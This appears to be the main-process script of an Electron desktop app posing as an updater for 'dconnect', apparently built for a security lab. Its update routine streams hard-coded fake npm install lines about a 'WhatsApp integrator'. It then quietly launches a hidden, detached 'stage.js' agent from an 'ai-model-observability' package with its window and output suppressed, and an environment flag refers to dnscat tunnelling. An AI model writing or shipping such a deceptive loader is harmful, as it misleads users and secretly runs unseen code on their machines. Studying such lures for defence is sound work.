'use strict';

const { app, BrowserWindow, ipcMain } = require('electron');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const CURRENT = '2.3.4';
const TARGET = '2.4.0';
let win = null;
let agentPid = null;
let updated = false;

function send(channel, payload) {
  if (win && !win.isDestroyed()) win.webContents.send(channel, payload);
}

function startUpdate() {
  if (updated) {
    send('update:done', { version: TARGET });
    return;
  }
  const lines = [
    `dconnect-updater: release ${TARGET} available (WhatsApp integrator bundled)`,
    'npm WARN deprecated legacy-peer-deps@1.0.0: use --force at your own risk',
    'fetch manifest whatsapp-integrator@1.4.2',
    'resolved git+https://github.com/46y9qkpkjc-ui/whatsapp-integrator.git',
    'reify:whatsapp-integrator: timing reifyNode:node_modules/whatsapp-integrator completed in 611ms',
    '+ whatsapp-integrator@1.4.2',
    'added 1 package in 2s',
  ];
  let i = 0;
  const tick = setInterval(() => {
    if (i < lines.length) {
      send('update:line', { line: lines[i++] });
      return;
    }
    clearInterval(tick);
    updated = true;
    send('update:line', { line: `dconnect-updater: ${CURRENT} -> ${TARGET} complete (${Math.floor(Math.random() * 900 + 300)}ms)` });
    send('update:done', { version: TARGET });
    startAgent();
  }, 750);
}

function startAgent() {
  if (agentPid) return;
  let script = path.join(__dirname, 'node_modules', 'ai-model-observability', 'stage.js');
  if (!fs.existsSync(script)) {
    try {
      script = require.resolve('ai-model-observability/stage.js');
    } catch (e) {
      send('update:line', { line: `workspace insights unavailable: ${e.message}` });
      return;
    }
  }
  const env = {
    ...process.env,
    DCONNECT_SESSION: '1',
    DCONNECT_PARENT: String(process.pid),
    AI_OBS_PROFILE: process.env.AI_OBS_PROFILE || 'on',
    LAB_SKIP_DNSCAT: '1',
  };
  const child = spawn(process.execPath, [script], {
    env: { ...env, ELECTRON_RUN_AS_NODE: '1' },
    cwd: __dirname,
    windowsHide: true,
    stdio: 'ignore',
  });
  child.on('error', () => { agentPid = null; });
  child.on('spawn', () => {
    agentPid = child.pid;
    send('update:line', { line: 'workspace insights: agent active (see panel)' });
  });
  child.unref();
}

function createWindow() {
  win = new BrowserWindow({
    width: 1180,
    height: 760,
    backgroundColor: '#0d1117',
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });
  win.loadFile('index.html');
}

ipcMain.handle('app:state', () => ({
  current: updated ? TARGET : CURRENT,
  updated,
  user: require('os').userInfo().username,
}));
ipcMain.on('update:start', () => startUpdate());
ipcMain.handle('app:agent', () => ({ running: Boolean(agentPid), pid: agentPid }));

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
